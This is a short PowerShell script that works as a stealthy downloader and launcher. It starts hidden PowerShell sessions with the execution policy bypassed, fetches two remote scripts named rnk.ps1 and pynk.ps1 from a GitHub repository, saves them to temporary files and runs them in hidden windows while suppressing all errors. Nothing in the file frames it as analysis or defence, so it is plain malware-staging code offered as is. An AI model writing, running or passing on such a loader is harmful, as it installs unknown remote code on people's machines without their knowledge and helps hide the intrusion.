cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"
# URLs of the files to download
$urls = @(
    "https://github.com/KevinDark5/data/raw/refs/heads/main/rnk.ps1",
    "https://github.com/KevinDark5/data/raw/refs/heads/main/pynk.ps1"
)

# Download and execute each file with Bypass policy
foreach ($url in $urls) {
    try {
        # Download the content of the file
        $scriptContent = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content

        # Check if the content is not empty
        if ($scriptContent) {
            # Save the script to a temporary file
            $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
            [System.IO.File]::WriteAllText($tempScript, $scriptContent)

            # Execute the script with Bypass ExecutionPolicy
            Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$tempScript`"" -WindowStyle Hidden
        }
    } catch {
        # Suppress errors
        $null = $_
    }
}
